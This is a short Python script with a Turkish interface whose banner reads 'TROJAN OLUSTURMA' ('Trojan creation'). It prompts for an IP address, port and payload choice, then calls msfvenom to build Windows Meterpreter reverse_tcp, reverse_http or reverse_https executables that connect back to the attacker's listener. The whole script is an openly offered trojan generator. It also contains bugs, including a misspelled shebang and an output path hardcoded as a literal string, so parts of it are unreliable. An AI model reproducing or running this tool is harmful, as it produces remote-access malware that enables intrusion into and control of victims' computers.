#!/usr/bin/env pyton



import os



os.system("apt-get install figlet")

os.system("clear")

os.system("figlet TROJAN OLUSTURMA")

print("""

Trojan Olusturma Aracina Hosgeldin Bol Sans :D



""")

ip = raw_input("Local veya Dis Ip Girin: ")

port = raw_input("Port Girin: ")



print("""



1) windows/meterpreter/reverse_tcp

2) windows/meterpreter/reverse_http

3) windows/meterpreter/reverse_https



""")



payload = raw_input("Payload No Girin: ")

kayityeri = raw_input("Kayit Yeri Girin: ")



if(payload=="1"):

	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o kayityeri")

elif(payload=="2"):

	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o kayityeri")

elif(payload=="3"):

	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o kayityeri")







